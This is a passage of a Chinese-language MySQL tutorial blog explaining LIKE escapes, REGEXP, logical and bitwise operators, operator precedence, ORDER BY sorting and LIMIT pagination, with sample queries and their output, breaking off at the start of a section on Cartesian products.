<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查询第<span class="number">2</span>个字符是_且第<span class="number">3</span>个字符是<span class="string">&#x27;a&#x27;</span>的员工信息</span><br><span class="line"># 需要使用转义字符: \ </span><br><span class="line"><span class="keyword">SELECT</span> last_name</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">WHERE</span> last_name <span class="keyword">LIKE</span> <span class="string">&#x27;_\_a%&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>如果使用<code>\</code>表示转义，要省略<code>ESCAPE</code>。如果不是<code>\</code>，则要加上<code>ESCAPE</code>。</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> last_name</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">WHERE</span> last_name <span class="keyword">LIKE</span> <span class="string">&#x27;_$_a%&#x27;</span> <span class="keyword">ESCAPE</span> <span class="string">&#x27;$&#x27;</span>;</span><br></pre></td></tr></table></figure>


<blockquote>
<p> <strong>REGEXP运算符</strong></p>
</blockquote>
<p>REGEXP运算符用来匹配字符串，语法格式为： <code>expr REGEXP 匹配条件</code> 。如果expr满足匹配条件，返回1；如果不满足，则返回0。若expr或匹配条件任意一个为NULL，则结果为NULL。</p>
<p>REGEXP运算符在进行匹配时，常用的有下面几种通配符：</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135924.png" alt="  "></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="string">&#x27;shkstart&#x27;</span> REGEXP <span class="string">&#x27;^s&#x27;</span>, <span class="string">&#x27;shkstart&#x27;</span> REGEXP <span class="string">&#x27;t$&#x27;</span>, <span class="string">&#x27;shkstart&#x27;</span> REGEXP <span class="string">&#x27;hk&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="string">&#x27;shkstart&#x27;</span> REGEXP <span class="string">&#x27;^s&#x27;</span> <span class="operator">|</span> <span class="string">&#x27;shkstart&#x27;</span> REGEXP <span class="string">&#x27;t$&#x27;</span> <span class="operator">|</span> <span class="string">&#x27;shkstart&#x27;</span> REGEXP <span class="string">&#x27;hk&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span>                      <span class="number">1</span> <span class="operator">|</span>                      <span class="number">1</span> <span class="operator">|</span>                      <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------------+------------------------+------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">2.04</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="string">&#x27;Tangyitao&#x27;</span> REGEXP <span class="string">&#x27;an.yit&#x27;</span>, <span class="string">&#x27;TYT&#x27;</span> REGEXP <span class="string">&#x27;[ab]&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="string">&#x27;Tangyitao&#x27;</span> REGEXP <span class="string">&#x27;an.yit&#x27;</span> <span class="operator">|</span> <span class="string">&#x27;TYT&#x27;</span> REGEXP <span class="string">&#x27;[ab]&#x27;</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+---------------------+</span></span><br><span class="line"><span class="operator">|</span>                           <span class="number">1</span> <span class="operator">|</span>                   <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------------+---------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>



<h2 id="4-逻辑运算符"><a href="#4-逻辑运算符" class="headerlink" title="4. 逻辑运算符"></a>4. 逻辑运算符</h2><p>逻辑运算符主要用来判断表达式的真假，在MySQL中，逻辑运算符的返回结果为1、0或者NULL。<br>MySQL中支持4种逻辑运算符如下：<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135926.png" alt="  "></p>
<blockquote>
<p><strong>逻辑非运算符</strong> </p>
<ul>
<li>逻辑非（NOT或!）运算符表示当给定的值为0时返回1；当给定的值为非0值时返回0；当给定的值为NULL时，返回NULL。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="keyword">NOT</span> <span class="number">1</span>, <span class="keyword">NOT</span> <span class="number">0</span>, <span class="keyword">NOT</span>(<span class="number">1</span><span class="operator">+</span><span class="number">1</span>), <span class="keyword">NOT</span> <span class="operator">!</span><span class="number">1</span>, <span class="keyword">NOT</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-------+----------+--------+----------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NOT</span> <span class="number">1</span> <span class="operator">|</span> <span class="keyword">NOT</span> <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NOT</span>(<span class="number">1</span><span class="operator">+</span><span class="number">1</span>) <span class="operator">|</span> <span class="keyword">NOT</span> <span class="operator">!</span><span class="number">1</span> <span class="operator">|</span> <span class="keyword">NOT</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-------+----------+--------+----------+</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">0</span> <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span>     <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+-------+----------+--------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>逻辑与运算符</strong> </p>
<ul>
<li>逻辑与（AND或&amp;&amp;）运算符是当给定的所有值均为非0值，并且都不为NULL时，返回 1；当给定的一个值或者多个值为0时则返回0；否则返回NULL。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">-1</span>, <span class="number">0</span> <span class="keyword">AND</span> <span class="number">1</span>, <span class="number">0</span> <span class="keyword">AND</span> <span class="keyword">NULL</span>, <span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+------------+------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">-1</span> <span class="operator">|</span> <span class="number">0</span> <span class="keyword">AND</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">0</span> <span class="keyword">AND</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+------------+------------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">1</span> <span class="operator">|</span>       <span class="number">0</span> <span class="operator">|</span>          <span class="number">0</span> <span class="operator">|</span>       <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+------------+------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.02</span> sec)</span><br></pre></td></tr></table></figure>


<blockquote>
<p><strong>逻辑或运算符</strong>  </p>
<ul>
<li>逻辑或（OR或||）运算符是当给定的值都不为NULL，并且任何一个值为非0值时，则返 回1，否则返回0；当一个值为NULL，并且另一个值为非0值时，返回1，否则返回NULL；当两个值都为 NULL时，返回NULL。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">OR</span> <span class="number">-1</span>, <span class="number">1</span> <span class="keyword">OR</span> <span class="number">0</span>, <span class="number">1</span> <span class="keyword">OR</span> <span class="keyword">NULL</span>, <span class="number">0</span> <span class="operator">||</span> <span class="keyword">NULL</span>, <span class="keyword">NULL</span> <span class="operator">||</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+--------+-----------+-----------+--------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="keyword">OR</span> <span class="number">-1</span> <span class="operator">|</span> <span class="number">1</span> <span class="keyword">OR</span> <span class="number">0</span> <span class="operator">|</span> <span class="number">1</span> <span class="keyword">OR</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">0</span> <span class="operator">||</span> <span class="keyword">NULL</span> <span class="operator">|</span> <span class="keyword">NULL</span> <span class="operator">||</span> <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+--------+-----------+-----------+--------------+</span></span><br><span class="line"><span class="operator">|</span>       <span class="number">1</span> <span class="operator">|</span>      <span class="number">1</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span>      <span class="keyword">NULL</span> <span class="operator">|</span>         <span class="keyword">NULL</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+--------+-----------+-----------+--------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong>：<br>OR可以和AND一起使用，但是在使用时要注意两者的优先级，由于AND的优先级高于OR，因此先对AND两边的操作数进行操作，再与OR中的操作数结合。</p>
</blockquote>
<blockquote>
<p><strong>逻辑异或运算符</strong> </p>
<ul>
<li>逻辑异或（XOR）运算符是当给定的值中任意一个值为NULL时，则返回NULL；如果 两个非NULL的值都是0或者都不等于0时，则返回0；如果一个值为0，另一个值不为0时，则返回1。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span> XOR <span class="number">-1</span>, <span class="number">1</span> XOR <span class="number">0</span>, <span class="number">0</span> XOR <span class="number">0</span>, <span class="number">1</span> XOR <span class="keyword">NULL</span>, <span class="number">1</span> XOR <span class="number">1</span> XOR <span class="number">1</span>, <span class="number">0</span> XOR <span class="number">0</span> XOR <span class="number">0</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+---------+------------+---------------+---------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> XOR <span class="number">-1</span> <span class="operator">|</span> <span class="number">1</span> XOR <span class="number">0</span> <span class="operator">|</span> <span class="number">0</span> XOR <span class="number">0</span> <span class="operator">|</span> <span class="number">1</span> XOR <span class="keyword">NULL</span> <span class="operator">|</span> <span class="number">1</span> XOR <span class="number">1</span> XOR <span class="number">1</span> <span class="operator">|</span> <span class="number">0</span> XOR <span class="number">0</span> XOR <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+---------+------------+---------------+---------------+</span></span><br><span class="line"><span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span>       <span class="number">1</span> <span class="operator">|</span>       <span class="number">0</span> <span class="operator">|</span>       <span class="keyword">NULL</span> <span class="operator">|</span>             <span class="number">1</span> <span class="operator">|</span>             <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+---------+------------+---------------+---------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>





<h2 id="5-位运算符"><a href="#5-位运算符" class="headerlink" title="5. 位运算符"></a>5. 位运算符</h2><p>位运算符是在二进制数上进行计算的运算符。位运算符会先将操作数变成二进制数，然后进行位运算，最后将计算结果从二进制变回十进制数。</p>
<p>MySQL支持的位运算符如下：</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135930.png" alt="  "></p>
<blockquote>
<p><strong>按位与运算符</strong> </p>
<ul>
<li>按位与（&amp;）运算符将给定值对应的二进制数逐位进行逻辑与运算。当给定值对应的二 进制位的数值都为1时，则该位返回1，否则返回0。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span> <span class="operator">&amp;</span> <span class="number">10</span>, <span class="number">20</span> <span class="operator">&amp;</span> <span class="number">30</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">&amp;</span> <span class="number">10</span> <span class="operator">|</span> <span class="number">20</span> <span class="operator">&amp;</span> <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0</span> <span class="operator">|</span> <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1的二进制数为0001，10的二进制数为1010，所以1 &amp; 10的结果为0000，对应的十进制数为0。20的二进制数为10100，30的二进制数为11110，所以20 &amp; 30的结果为10100，对应的十进制数为20。</p>
</blockquote>
<blockquote>
<p><strong>按位或运算符</strong> </p>
<ul>
<li>按位或（|）运算符将给定的值对应的二进制数逐位进行逻辑或运算。当给定值对应的 二进制位的数值有一个或两个为1时，则该位返回1，否则返回0。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">10</span>, <span class="number">20</span> <span class="operator">|</span> <span class="number">30</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span> <span class="number">20</span> <span class="operator">|</span> <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span> <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
</blockquote>
<blockquote>
<p><strong>按位异或运算符</strong> </p>
<ul>
<li>按位异或（^）运算符将给定的值对应的二进制数逐位进行逻辑异或运算。当给定值 对应的二进制位的数值不同时，则该位返回1，否则返回0。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span> <span class="operator">^</span> <span class="number">10</span>, <span class="number">20</span> <span class="operator">^</span> <span class="number">30</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">^</span> <span class="number">10</span> <span class="operator">|</span> <span class="number">20</span> <span class="operator">^</span> <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 1的二进制数为0001，10的二进制数为1010，所以1 ^ 10的结果为1011，对应的十进制数为11。20的二进制数为10100，30的二进制数为11110，所以20 ^ 30的结果为01010，对应的十进制数为10。</p>
</blockquote>
<blockquote>
<p><strong>按位取反运算符</strong>  </p>
<ul>
<li>按位取反（~）运算符将给定的值的二进制数逐位进行取反操作，即将1变为0，将0变 为1。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">10</span> <span class="operator">&amp;</span> <span class="operator">~</span><span class="number">1</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">&amp;</span> <span class="operator">~</span><span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>由于按位取反（~）运算符的优先级高于按位与（&amp;）运算符的优先级，所以10 &amp; ~1，首先，对数字1进行按位取反操作，结果除了最低位为0，其他位都为1，然后与10进行按位与操作，结果为10。</p>
</blockquote>
<blockquote>
<p><strong>按位右移运算符</strong> </p>
<ul>
<li>按位右移（&gt;&gt;）运算符将给定的值的二进制数的所有位右移指定的位数。右移指定的 位数后，右边低位的数值被移出并丢弃，左边高位空出的位置用0补齐。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span> <span class="operator">&gt;&gt;</span> <span class="number">2</span>, <span class="number">4</span> <span class="operator">&gt;&gt;</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">&gt;&gt;</span> <span class="number">2</span> <span class="operator">|</span> <span class="number">4</span> <span class="operator">&gt;&gt;</span> <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">0</span> <span class="operator">|</span> <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1的二进制数为0000 0001，右移2位为0000 0000，对应的十进制数为0。4的二进制数为0000 0100，右移2位为0000 0001，对应的十进制数为1。</p>
</blockquote>
<blockquote>
<p><strong>按位左移运算符</strong> </p>
<ul>
<li>按位左移（&lt;&lt;）运算符将给定的值的二进制数的所有位左移指定的位数。左移指定的 位数后，左边高位的数值被移出并丢弃，右边低位空出的位置用0补齐。</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="number">1</span> <span class="operator">&lt;&lt;</span> <span class="number">2</span>, <span class="number">4</span> <span class="operator">&lt;&lt;</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">1</span> <span class="operator">&lt;&lt;</span> <span class="number">2</span> <span class="operator">|</span> <span class="number">4</span> <span class="operator">&lt;&lt;</span> <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">4</span> <span class="operator">|</span> <span class="number">16</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>1的二进制数为0000 0001，左移两位为0000 0100，对应的十进制数为4。4的二进制数为0000 0100，左移两位为0001 0000，对应的十进制数为16。</p>
</blockquote>
<h2 id="6-运算符的优先级"><a href="#6-运算符的优先级" class="headerlink" title="6. 运算符的优先级"></a>6. 运算符的优先级</h2><p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135936.png" alt="  ">数字编号越大，优先级越高，优先级高的运算符先进行计算。可以看到，赋值运算符的优先级最低，使用“()”括起来的表达式的优先级最高。</p>
<hr>
<h1 id="五、排序与分页"><a href="#五、排序与分页" class="headerlink" title="五、排序与分页"></a>五、排序与分页</h1><h2 id="1-排序"><a href="#1-排序" class="headerlink" title="1. 排序"></a>1. 排序</h2><h3 id="（1）排序规则"><a href="#（1）排序规则" class="headerlink" title="（1）排序规则"></a>（1）排序规则</h3><ul>
<li>使用 <code>ORDER BY</code> 子句排序</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ASC</span>（ascend）: 升序</span><br><span class="line"><span class="keyword">DESC</span>（descend）:降序</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ORDER BY</code> 子句在SELECT语句的结尾。</li>
</ul>
<h3 id="（2）单列排序"><a href="#（2）单列排序" class="headerlink" title="（2）单列排序"></a>（2）单列排序</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 按照salary从高到低的顺序显示员工信息</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,last_name,salary</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> salary <span class="keyword">DESC</span>;</span><br><span class="line"># 如果在<span class="keyword">ORDER</span> <span class="keyword">BY</span> 后没有显式指名排序的方式的话，则默认按照升序排列。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 我们可以使用列的别名，进行排序</span><br><span class="line"># 列的别名只能在 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 中使用，不能在<span class="keyword">WHERE</span>中使用。</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,salary,salary <span class="operator">*</span> <span class="number">12</span> annual_sal</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> annual_sal;</span><br><span class="line"></span><br><span class="line"># 强调格式：<span class="keyword">WHERE</span> 需要声明在<span class="keyword">FROM</span>后，<span class="keyword">ORDER</span> <span class="keyword">BY</span>之前。</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,salary</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">WHERE</span> department_id <span class="keyword">IN</span> (<span class="number">50</span>,<span class="number">60</span>,<span class="number">70</span>)</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> department_id <span class="keyword">DESC</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="（3）多列排序"><a href="#（3）多列排序" class="headerlink" title="（3）多列排序"></a>（3）多列排序</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 显示员工信息，按照department_id的降序排列，salary的升序排列</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,salary,department_id</span><br><span class="line"><span class="keyword">FROM</span> employees</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> department_id <span class="keyword">DESC</span>,salary <span class="keyword">ASC</span>;</span><br></pre></td></tr></table></figure>


<blockquote>
<ul>
<li>可以使用不在SELECT列表中的列排序。</li>
<li>在对多列进行排序的时候，首先排序的第一列必须有相同的列值，才会对第二列进行排序。如果第 一列数据中所有值都是唯一的，将不再对第二列进行排序。</li>
</ul>
</blockquote>
<h2 id="2-分页"><a href="#2-分页" class="headerlink" title="2. 分页"></a>2. 分页</h2><h3 id="（1）实现规则"><a href="#（1）实现规则" class="headerlink" title="（1）实现规则"></a>（1）实现规则</h3><ul>
<li>分页原理<br>所谓分页显示，就是将数据库中的结果集，一段一段显示出来需要的条件。</li>
<li>MySQL中使用 LIMIT 实现分页</li>
<li>格式</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">LIMIT [位置偏移量,] 行数</span><br><span class="line"></span><br><span class="line">第一个“位置偏移量”参数指示MySQL从哪一行开始显示，是一个可选参数，如果不指定“位置偏移</span><br><span class="line">量”，将会从表中的第一条记录开始（第一条记录的位置偏移量是<span class="number">0</span>，第二条记录的位置偏移量是</span><br><span class="line"><span class="number">1</span>，以此类推）；第二个参数“行数”指示返回的记录条数</span><br></pre></td></tr></table></figure>


<ul>
<li>例子</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 前<span class="number">10</span>条记录：</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名 LIMIT <span class="number">0</span>,<span class="number">10</span>;</span><br><span class="line">或者</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名 LIMIT <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"># 第<span class="number">11</span>至<span class="number">20</span>条记录：</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名 LIMIT <span class="number">10</span>,<span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"># 第<span class="number">21</span>至<span class="number">30</span>条记录：</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名 LIMIT <span class="number">20</span>,<span class="number">10</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>MySQL 8.0中可以使用<code>LIMIT 3 OFFSET 4</code>，意思是获取从第5条记录开始后面的3条记录，和<code>LIMIT 4,3</code>返回的结果相同。</li>
</ul>
</blockquote>
<ul>
<li><p>分页显式公式：**<code>（当前页数-1）* 每页条数，每页条数</code>**</p>
</li>
<li><p><code>LIMIT</code> 子句必须放在整个<code>SELECT</code>语句的最后</p>
</li>
</ul>
<blockquote>
<p><strong>使用 LIMIT 的好处</strong></p>
<ul>
<li>约束返回结果的数量可以 &#x3D;&#x3D;减少数据表的网络传输量 ，也可以 提升查询效率 &#x3D;&#x3D;。如果我们知道返回结果只有 1 条，就可以使用 LIMIT 1 ，告诉 SELECT 语句只需要返回一条记录即可。这样的好处就是 SELECT 不需要扫描完整的表，只需要检索到一条符合条件的记录即可返回。</li>
</ul>
</blockquote>
<h3 id="（2）拓展"><a href="#（2）拓展" class="headerlink" title="（2）拓展"></a>（2）拓展</h3><p>在不同的 DBMS 中使用的关键字可能不同。在 MySQL、PostgreSQL、MariaDB 和 SQLite 中使用 LIMIT 关键字，而且需要放到 SELECT 语句的最后面。</p>
<ul>
<li>如果是 SQL Server 和 Access，需要使用 <code>TOP</code> 关键字</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">5</span> name, hp_max <span class="keyword">FROM</span> heros <span class="keyword">ORDER</span> <span class="keyword">BY</span> hp_max <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>



<hr>
<h1 id="六、多表查询"><a href="#六、多表查询" class="headerlink" title="六、多表查询"></a>六、多表查询</h1><p><strong>多表查询，也称为关联查询，指两个或更多个表一起完成查询操作。</strong></p>
<ul>
<li><strong>前提条件</strong>：这些一起查询的表之间是有关系的（一对一、一对多），它们之间一定是有关联字段，这个关联字段可能建立了外键，也可能没有建立外键。比如：员工表和部门表，这两个表依靠“部门编号”进行关联。</li>
</ul>
<h2 id="1-笛卡尔积"><a href="#1-笛卡尔积" class="headerlink" title="1. 笛卡尔积"></a>1. 笛卡尔积</h2><h3 id="（1）笛卡尔积说明"><a href="#（1）笛卡尔积说明" class="headerlink" title="（1）笛卡尔积说明"></a>（1）笛卡尔积说明</h3><p>笛卡尔乘积是一个数学运算。假设我有两个集合 X 和 Y，那么 X 和 Y 的笛卡尔积就是 X 和 Y 的所有可能组合，也就是第一个对象来自于 X，第二个对象来自于 Y 的所有可能。组合的个数即为两个集合中元素个数的乘积数。</p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815135942.png" alt="  "></p>
<p>SQL92中，笛卡尔积也称为&#x3D;&#x3D;交叉连接&#x3D;&#x3D; ，英文是 <code>CROSS JOIN</code> 。在 SQL99 中也是使用 CROSS JOIN表示交叉连接。它的作用就是可以把任意表进行连接，即使这两张表不相关。在MySQL中如下情况会出现笛卡尔积：</p>
